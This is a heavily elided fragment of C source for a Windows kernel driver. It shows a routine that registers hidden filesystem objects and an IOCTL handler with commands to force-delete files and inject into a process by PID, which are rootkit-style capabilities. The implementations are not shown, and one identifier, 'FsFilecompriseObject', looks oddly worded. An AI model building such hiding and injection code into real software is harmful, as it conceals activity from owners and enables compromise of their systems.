...
NTSTATUS AddHiddenObject(PHid_HideObjectPacket Packet, USHORT Size, PULONGLONG ObjId)
{
	...
	case FsDirObject:
		...
		break;
	case FsFilecompriseObject:
		status = AddHiddenFilecomprise(&path, ObjId);
		break;
	default:
...
NTSTATUS IrpDeviceControlHandler(PDEVICE_OBJECT  DeviceObject, PIRP  Irp)
{
	...
	case HID_IOCTL_DELETE_FILE:
	{
		...
		RtlInitUnicodeString(&ustrFileName, inputBuffer);
		result.status = ForceDeleteFile(ustrFileName);
	}
	break;
	case HID_IOCTL_INJECT_PID:
	{
		ULONG* pid= inputBuffer;
		result.status = Inject(*pid);
	}
	break;
	// Other
	default:
